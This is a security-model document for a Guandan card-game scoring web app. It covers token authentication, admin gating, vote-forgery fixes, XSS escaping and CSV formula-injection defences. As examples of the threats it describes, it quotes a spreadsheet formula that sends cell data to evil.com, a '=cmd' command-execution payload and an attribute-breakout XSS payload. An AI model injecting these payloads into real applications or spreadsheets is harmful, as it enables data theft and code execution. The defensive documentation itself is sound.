# Security Model

Last reviewed: 2026-05-05 (XSS coverage extended via 0bf1b90 + CSV formula-injection guard added — see CSV protections below)
Prior audit: 2026-05-02 (fa18718)

This document describes how authentication, authorization, and input handling work in
the Guandan scorer. It exists because a 2026-05 audit found multiple CRITICAL
issues — every fix is documented here so future contributors don't reintroduce them.

---

## Threat model

The app is a personal card-game scorer. There's no money, no PII beyond chosen
handles + optional photos, no chat. The realistic threats are:

1. **Vandalism** — someone with a room URL corrupts the host's game state, or
   someone with a player handle rewrites another player's display name / photo.
2. **Stat forgery** — a player POSTs inflated win counts or vote totals to the
   profile API, faking their leaderboard standing.
3. **XSS** — a malicious display name (`<script>...</script>`) injected via the
   profile-create flow renders in another user's victory modal / search results.
4. **DoS via expensive admin endpoint** — anyone triggers `migrate-modes.js`
   which loops every player in KV and rewrites them.

Threats deliberately out of scope: rate limiting per-IP (no abuse seen),
captchas, MFA, account recovery flows.

---

## Authentication

### Room hosts (`api/rooms/*`)

| When | What |
|---|---|
| `POST /api/rooms/create` | Server generates a 32-byte random `authToken`, stores it in the room object in KV, and returns it ONCE in the response. Host must persist it (currently in-memory in `roomManager.js`; survives via the URL `?auth=<token>` parameter for re-joins). |
| `GET /api/rooms/<code>` | Always strips `authToken` from the response payload and returns a reconciled `state.gameStatus` based on the stored history. Viewers can read game state but never see the host token. If a Bearer token is supplied, `hostVerified: true` is returned only when the room already has a stored token and it matches. |
| `PUT /api/rooms/<code>` | Requires `Authorization: Bearer <token>` header. Token is constant-time-compared against the stored token. Returns 403 on mismatch. |

The client treats a successful room-create response without `authToken` as a
failed create contract and does not generate a fallback host token locally.
Room creation also initializes server-owned room metadata: `isFavorite` is
always false, favorite timestamps are discarded, and active/archived vote
stores start empty regardless of client-supplied fields.

**Trust-on-first-use (TOFU) for legacy rooms.** Rooms created before the audit
have no `authToken` field stored. The first PUT to such a room accepts whatever
token the client sends and pins it as the host token. Subsequent PUTs require
the same token. This avoids breaking 24h in-flight rooms without weakening
the going-forward security posture.

TOFU applies only to state-changing PUTs. GET does not treat an arbitrary Bearer
token as verified host auth for a legacy no-token room.

**Fail-closed if no token at all.** For legacy TOFU rooms, a PUT with no
`Authorization` header is rejected (403). Current room creation requires the
server-issued token; the client no longer generates a replacement token when a
create response is missing `authToken`. Legacy room URLs that already carry an
`auth` query parameter can still pin that token on their first PUT.

### Admin endpoints (`api/players/*`)

The following endpoints require admin authentication:

- `POST /api/players/delete` — permanent player deletion
- `POST /api/players/reset-stats` — clear stats but keep identity
- `POST /api/players/migrate-modes` — mass-rewrite all players in KV
- `POST /api/players/migrate-single` — rewrite one player's mode stats
- `POST /api/players/backfill-duration` — mutate one player's recent-game durations
- `PUT /api/players/<handle>` with `mode: 'PROFILE_UPDATE'` — change displayName /
  emoji / tagline / photoBase64

**Authentication mechanism:** request body must include `adminToken`. The server
validates it against the `ADMIN_TOKEN` environment variable using a constant-time
compare (see `validateAdminToken` in `api/players/_utils.js`).

**Fail-closed if env unset.** If `ADMIN_TOKEN` is not set in the deployment env,
ALL admin endpoints reject every request with 403. There is no fallback. This is
intentional — an unconfigured admin endpoint must not be a footgun.

#### Deployment requirement

```bash
# Generate a secure token
openssl rand -hex 32

# Set in Vercel
vercel env add ADMIN_TOKEN production
```

Without this, deletion / reset / mass migration / profile editing are unavailable.

---

## Known limitations & TODOs

### PROFILE_UPDATE auth (resolved 2026-05-03)

Before the audit, anyone with a player handle could rewrite that player's
profile fields. The 2026-05-02 audit gated PROFILE_UPDATE behind the admin
token to stop vandalism, which also broke self-edit. Both holes are now closed
by per-user ownership tokens shipped 2026-05-03.

**Auth model:**

- At create-time (`POST /api/players/create`), the server generates a 32-byte
  CSPRNG hex token (`generateOwnershipToken` in `_utils.js`), stores its SHA-256
  hash on the player record (`ownershipTokenHash`), and returns the raw token
  ONCE in the response.
- Hashing matters here even though the admin token isn't hashed — admin is one
  shared env-var secret; per-user tokens fan out across all KV records, so the
  KV-leak blast radius justifies preimage resistance. Stripping the hash from
  every player-shaped response (create / GET / list / reset-stats / PROFILE_UPDATE
  return) prevents accidental leakage too.
- Client persists the raw token in `localStorage` keyed by handle
  (`gd_owner_token_<handle>`) via `playerApi.js → saveOwnershipToken`.
- `PUT /api/players/<handle>` PROFILE_UPDATE accepts EITHER:
  - `adminToken` in the body (admin override), validated via `validateAdminToken`
  - `Authorization: Bearer <token>` header (owner self-edit), validated via
    `validateOwnershipToken` — async SHA-256 hash + constant-time hex compare
- The edit modal (`playerEditModal.js`) sends the Bearer header silently when
  the device has the token in localStorage, otherwise reveals an admin-token
  input as fallback (cross-device or token-cleared users still need admin).

**Token rotation (added 2026-05-03):**

- `PUT /api/players/<handle>` with `mode: 'ROTATE_TOKEN'` issues a fresh
  ownership token. Auth: admin body token OR current owner Bearer. Server
  generates new 32-byte CSPRNG token, replaces stored hash, returns raw new
  token ONCE. Old token is dead the instant the new hash is persisted —
  pre-existing copies on other devices are immediately invalidated.
- Edit modal exposes the affordance as "重新生成令牌" alongside
  "登出本设备" in the device-management section at the bottom of the form.
- Use cases: shared-device hygiene, suspected token leak, routine rotation.

**Remaining limitations:**

- Legacy players (created before 2026-05-03) have no `ownershipTokenHash`,
  so they fall through to admin-only edit. No migration; eventually they
  re-create or admin handles edits. Token rotation does NOT bootstrap one
  for these players — by design, since rotation requires an existing token
  to authorize the swap.

### Stats-update auth (resolved 2026-05-03)

`PUT /api/players/<handle>` with `mode !== 'PROFILE_UPDATE'` previously had
**no auth check** — any unauthenticated client could pollute career stats
(ranking averages, MVP votes, honor counts, partner/opponent graph, win
streaks). Uncovered during the ownership-token review when contrasted with
the now-properly-gated PROFILE_UPDATE path; closed the same day with a
3-tier auth gate.

**Auth model:**

The stats handler accepts ANY of three credentials, in priority order:

1. **`adminToken` body field** — admin override, validated via
   `validateAdminToken` (constant-time vs `ADMIN_TOKEN` env)
2. **`Authorization: Bearer <ownershipToken>`** matching the target handle's
   stored `ownershipTokenHash` — owner self-update from their own device
   (only path available for LOCAL games)
3. **`Authorization: Bearer <roomAuthToken>`** matching the stored
   `authToken` on the room identified by `gameResult.roomCode` AND the target
   handle is in that room's `players[]` — host writing for a participant of
   their own room
   - Participant matching accepts both modern `players[].handle` and legacy
     `players[].profileHandle`; `session` placeholders and invalid handle
     strings do not authorize profile writes.

Without one of those, writes 403. The room-host check is the primary
production path — host's `syncProfileStats` passes its room token to every
`updatePlayerStats` call, the server validates membership before accepting.

**Defense in depth:** even with the gate above, the stats handler snapshots
`player.ownershipTokenHash` and `player.id` before mutation and restores
them before save, so a future bug that allowed mutation through gameResult
fields can't escalate to credential overwrite.

**Vote counts** are still client-supplied within the authenticated request.
Server-side authoritative fetch from `/api/rooms/vote/<code>` is a P1
follow-up; the immediate auth gate raises the bar from "anyone" to
"only the host or owner", which closes the practical attack vector even
without authoritative vote fetching.

**Accepted LOW findings (security review 2026-05-03):**

- *Room existence oracle.* The auth gate's `kv.get('room:${roomCode}')` runs
  before the Bearer compare, leaking "room exists?" via timing. Room codes
  are discoverable via `/api/rooms/list` anyway, so no confidential signal
  leaks. Adding a dummy-op cover would cost a KV roundtrip per request
  without raising the bar. Trade-off documented inline in `[handle].js`.
- *Per-path timing differential.* The three auth checks short-circuit
  sequentially (admin → owner SHA → host KV+compare). A request with no
  Bearer returns faster than one that triggers the SHA path. This reveals
  "you sent a Bearer" vs "you didn't" — not which path matched. No
  actionable leak; accepted.

### Vote forgery (resolved 2026-05-03)

Previously `PUT /api/players/<handle>` stats path accepted `mvpVoteCount` and
`burdenVoteCount` from the client body — even an authenticated host could
inflate vote totals via `mvpVoteCount: 999`. Closed in the same batch as the
P1 follow-ups.

**Auth proves identity, not truth-of-claim.** For room games, the stats
handler now reads vote counts from authoritative server storage:

1. The room is already loaded for the auth gate (host-Bearer check needs
   `room.authToken` and `room.players[]`)
2. After auth passes, the same room is consulted for
   `room.endGameVotes.mvp[targetPlayerId]` and the burden equivalent
3. Authoritative values overwrite `gameResult.mvpVoteCount` /
   `burdenVoteCount` for the rest of the handler — `votingHistory` deltas
   compute against truth, not claim
4. Profile `votingHistory` keys are derived from authoritative room state as
   vote-session keys, not only the bare room code. Reset/new voting windows in
   the same room therefore do not overwrite or subtract a previous window's
   lifetime vote contribution. First-epoch legacy `roomCode` keys are preserved
   only when already present, avoiding double-counting data synced before the
   vote-session key migration.

For LOCAL games (no shared room storage), client values are still trusted
because there's no alternative source. This is acceptable because the auth
gate already restricts LOCAL writes to owner-Bearer (player's own
profile from their own device) — worst case is self-spam, not cross-player
inflation. LOCAL games also send a client-derived vote-session key with the
completed session stats so repeated local sessions do not all collapse into a
single `LOCAL` votingHistory entry.

Complete profile-session stats use a separate game-session idempotency key and
`player.stats.sessionHistory`. Unlike vote-session keys, the game-session key
does not include the vote reset epoch. If the host repeats the final profile
sync, the handler only applies the idempotent voting delta and returns
`duplicateSessionIgnored: true`; it does not add another session, streak,
partner/opponent edge, honor, mode-stat entry, or recent game.

### Vote fingerprint cap (resolved 2026-05)

`api/rooms/vote/[code].js` caps `room.endGameVotes.fingerprints` to the last
1000 entries. This keeps duplicate-vote detection bounded so the room JSON
record does not grow without limit.
Fingerprints are internal duplicate-vote state only: both
`GET /api/rooms/vote/<code>` and `GET /api/rooms/<code>` return public vote
totals/epochs without exposing current or archived fingerprint lists.
Because `GET /api/rooms/<code>` is public, `PUT /api/rooms/<code>` does not
trust client-supplied active vote state while the room is ended; it preserves
the authoritative vote totals/fingerprints already in KV. When the host
reopens a room through reset/rollback sync, the same PUT path clears the active
vote store so stale fingerprints cannot block the next voting window.

### Vote reset clears authoritative vote state (resolved 2026-06-10)

`POST /api/rooms/reset-vote/<code>` now clears the authoritative
`room.endGameVotes` store used by the live vote endpoints, including
fingerprints. Previous results are archived in a bounded
`room.endGameVotesHistory` array before the store is reset to empty. This
prevents a host reset from leaving stale vote counts visible or causing
viewers to be rejected as duplicate voters in the next voting window.
`reset-vote` also bumps `room.lastUpdated`, so viewer polling observes the new
vote epoch. Frontend local duplicate-vote markers and profile `votingHistory`
both use vote-session keys that include the archived vote epoch.

### Vote payload validation (resolved 2026-06-10)

`POST /api/rooms/vote/<code>` now validates the vote against authoritative
room data before mutating `room.endGameVotes`:

- MVP and burden IDs are normalized and must be distinct after normalization
- Both IDs must exist in `room.players[]`
- A non-empty viewer fingerprint is required and normalized before duplicate
  checks; missing or oversized fingerprints are rejected with
  `invalid_fingerprint`
- Voting is accepted only after `state.gameStatus.ended === true`, with a
  legacy history-note fallback for older rooms

This prevents forged votes for non-participants and prevents pre-end-game
vote writes from bypassing the viewer UI lock. Requiring a server-validated
fingerprint also prevents direct POSTs without fingerprints from bypassing the
duplicate-vote guard.

### Room write endpoints (resolved 2026-06-10)

Room state mutations require the room host Bearer token:

- `PUT /api/rooms/<code>` — update game state
- `POST /api/rooms/reset-vote/<code>` — archive/reset voting state
- `POST /api/rooms/favorite/<code>` — make a room permanent
- `DELETE /api/rooms/favorite/<code>` — remove permanent favorite status

All API endpoints now return a real `204` CORS preflight response for
`OPTIONS`; success-response CORS headers alone are not enough for browser
preflight.

---

## XSS protections

The app uses vanilla template literals (no React / Vue / framework escaping).
This means every dynamic string interpolation MUST be escaped before it lands in
`innerHTML`.

**Helper:** `escapeHtml(value)` in `src/core/utils.js`. Escapes `& < > " '`.
Both content interpolation (innerHTML body) and attribute interpolation
(`alt="${...}"`, `value="${...}"`) need it — `&quot;` and `&#39;` neutralize
attribute-breakout, which is the most overlooked XSS vector.

**Escaped surfaces (audit fa18718 + 2026-05-05 extension `0bf1b90`):**
- `playerSearch.js` — display name, handle, play-style label, search query
- `playerEditModal.js` — display name, handle, emoji, photo URL, tagline
- `victoryModal.js` — MVP name + tagline; vote button names + emojis + IDs;
  leaderboard MVP/burden entries; results-block names + emojis + counts
- `photoRenderer.js` *(2026-05-05)* — `alt`-attribute, photoBase64 src, emoji
  fallback. `alt=""` breakout was the real XSS: a malicious `displayName`
  containing `"><img src=x onerror=...>` would close the alt and inject markup.
- `stats/statistics.js` *(2026-05-05)* — stats-table rows (`emoji` + `name` +
  team-name from user-editable config), team MVP / Burden cards
- `ui/panelManager.js` *(2026-05-05)* — collapsed team-roster panel rendered
  after `lockTeamAssignmentPanel`
- `share/votingManager.js` *(2026-05-05)* — ~24 sites: locked voting card,
  unlocked vote buttons, in-progress status, vote-results-to-viewer,
  leaderboard, host voting interface

**Verification:** the 2026-05-05 extension was verified by re-running the
visual regression suite — 65/65 baselines pass with zero pixel diff because
escaping pure CJK + emoji content is byte-identical (no `&<>"'` characters
in the deterministic test fixtures).

**Unescaped surfaces that may want defense-in-depth later:**
- `playerCreateModal.js` — interpolations are from hardcoded constants
  (`ANIMAL_EMOJIS`, `getPlayStyles()` return), not user input or API. Form
  `<input>` values never reach `innerHTML`. No actionable XSS surface;
  parity-only escapes deferred.
- `exportMobile.js` — Canvas `ctx.fillText` doesn't parse HTML, so XSS via
  injected markup isn't possible, but a long enough name could overflow the
  canvas. Length validation at the create endpoint already caps this.

---

## CSV protections

CSV export (`src/export/exportHandlers.js`) goes through a single `csvEscape`
chokepoint applied to every cell in every row. As of 2026-05-05 it handles
both quoting and **CSV formula-injection** prevention.

**The vector:** display names and tagline have no charset restriction in
`api/players/_utils.js` `validatePlayerData` — `displayName: "=HYPERLINK(\"//evil.com/?x=\"&A1,\"Click\")"` is accepted at create time. When this name flows through the
session into `playerRankStr` (`p.emoji + p.name`) and lands in a CSV cell,
opening the CSV in Excel / Numbers / LibreOffice executes the formula — typically
weaponized as a clickable phishing link or a `=cmd|'/c calc'!A1` command in
older Excel.

**The mitigation:** `csvEscape` checks the leading character against
`/^[=+\-@\t\r]/` and prefixes with a single quote (`'`) before the standard
RFC 4180 quote-wrap. The single-quote sigil tells spreadsheet apps "treat as
text, do not parse as formula." This is the OWASP-recommended approach.

**Coverage:** all CSV cells — both data rows (player rankings, team names,
upgrade strings, A-level notes) and the header row (`${t1Name}级` etc., where
team names are user-editable in config). 14-case standalone test confirms
formula triggers prefix correctly, RFC 4180 quoting still applies on commas /
newlines / double quotes, plain text + CJK + emoji content unchanged.

TXT and PNG exports are not HTML and not spreadsheet-parsed (TXT is a Blob
with `type: 'text/plain'`; PNG goes through `ctx.fillText` which only renders
glyphs). No additional escaping needed there.

---

## Input validation

`api/players/_utils.js` `validatePlayerData` validates:
- handle: 3-20 chars, `[a-zA-Z0-9_]`, excluding object-prototype keys
  (`__proto__`, `prototype`, `constructor`) because handles are also used as
  relationship-map keys in profile stats
- playStyle: enum of 9 values
- displayName: max 40 chars (added 2026-05-06 alongside the toast notification system — unbounded names would break toast layout and enable griefing in shared rooms)
- tagline: max 50 chars
- photoBase64: must start with `data:image/`, max ~150KB

All player mutation and maintenance endpoints that accept a handle now reuse
`validateHandle` before reading or writing KV, including admin-only delete,
reset, single-player migration, duration backfill, and public `touch`.

Player and room JSON mutation endpoints reject malformed, `null`, array, or
otherwise non-object JSON bodies with 400 before auth, business logic, or KV
access. This includes admin-only maintenance endpoints such as mode migration
and duration backfill.
Public player list/search reads parse each KV record independently and skip
malformed legacy records, so one bad profile cannot turn the whole list into a
500 response.

`api/players/<handle>` stats updates normalize session fields before profile
mutation: ranking, team, session counts/duration, relation handles, session
keys, vote booleans, and `honorsEarned`. Session and vote idempotency keys
reject object-prototype keys (`__proto__`, `prototype`, `constructor`) before
they can become `sessionHistory` / `votingHistory` object properties.
`honorsEarned` must be an array of current honor titles, is capped to the
current honor catalog size, and is deduplicated before incrementing lifetime
honor counters.

`api/rooms/[code].js` validates:
- roomCode: `^[A-Z0-9]{6}$`
- gameData: must include `settings`, `state`, `players`

`calculateUpgrade` (`src/game/calculator.js`) validates:
- ranks length matches mode (2/3/4 entries for 4/6/8 player respectively)
- ranks are integers in valid range (`parseRanks`)
- no duplicates in ranks

---

## Files touched by the 2026-05 audit

| File | Concern |
|---|---|
| `api/rooms/create.js` | Server-side token generation |
| `api/rooms/[code].js` | Bearer auth on PUT, strip token from GET, TOFU |
| `api/rooms/_auth.js` | Shared room host Bearer validation |
| `api/rooms/favorite/[code].js` | Host auth on favorite/unfavorite |
| `api/rooms/reset-vote/[code].js` | Host auth on vote reset |
| `api/_cors.js` | Shared CORS preflight handling |
| `api/players/_utils.js` | `validateAdminToken` helper (constant-time) |
| `api/players/delete.js` | Use validateAdminToken + validateHandle |
| `api/players/reset-stats.js` | Use validateAdminToken + validateHandle |
| `api/players/migrate-modes.js` | Add admin gate (was public) |
| `api/players/migrate-single.js` | Add admin gate (was public) + validateHandle |
| `api/players/backfill-duration.js` | POST-only admin gate (was public GET mutation) + validateHandle |
| `api/players/[handle].js` | Admin gate on PROFILE_UPDATE; public GET migration disabled |
| `src/core/utils.js` | `escapeHtml` helper |
| `src/player/playerSearch.js` | Apply escapeHtml |
| `src/player/playerEditModal.js` | Apply escapeHtml |
| `src/ui/victoryModal.js` | Apply escapeHtml |
| `src/player/photoRenderer.js` | Apply escapeHtml *(2026-05-05 extension)* |
| `src/stats/statistics.js` | Apply escapeHtml *(2026-05-05 extension)* |
| `src/ui/panelManager.js` | Apply escapeHtml *(2026-05-05 extension)* |
| `src/share/votingManager.js` | Apply escapeHtml *(2026-05-05 extension)* |
| `src/export/exportHandlers.js` | `csvEscape` formula-injection guard *(2026-05-05 extension)* |
| `src/share/roomManager.js` | Use server-issued token |
| `players.html` | Remove client-side admin password leak |
| `CLAUDE.md` | Remove leaked password reference |
| `.env.example` | Document `ADMIN_TOKEN` |
